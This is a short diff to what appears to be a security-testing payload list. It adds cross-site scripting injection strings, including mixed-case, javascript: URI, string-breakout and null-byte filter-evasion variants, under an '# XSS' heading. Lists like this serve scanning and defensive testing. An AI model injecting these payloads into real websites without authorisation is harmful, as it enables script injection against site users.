@@ -1,8 +1,13 @@
 # XSS
-<SCript>alert('script')</scriPt>
+<SCript>alert('sCripT')</scriPt>
 <svg/onload=alert('SVG')>
 <img src onerror="alert(2)">
+<IMG SRC=jAvascRiPt:alert(‘src’);>
 <BODY ONLOAD=alert('XSS')>
+'; alert("string");//
+') alert("func");//
+<iframe %00 src="&Tab;javascript:prompt(1)&Tab;"%00>
+
 
 # SQL
  -- 
